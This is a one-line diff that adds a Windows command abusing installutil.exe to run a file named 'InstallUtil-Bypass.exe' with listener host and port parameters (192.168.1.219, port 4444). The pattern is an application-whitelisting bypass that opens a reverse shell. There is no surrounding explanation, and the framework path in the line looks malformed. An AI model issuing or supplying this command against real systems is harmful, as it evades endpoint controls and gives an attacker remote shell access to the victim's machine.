@@ -1,0 +1,1 @@
+C:\Windows\Microsoft.NET\Framework644.0.30319\installutil.exe /logfile= /LogToConsole=false /U /LHOST=192.168.1.219 /LPORT=4444 InstallUtil-Bypass.exe
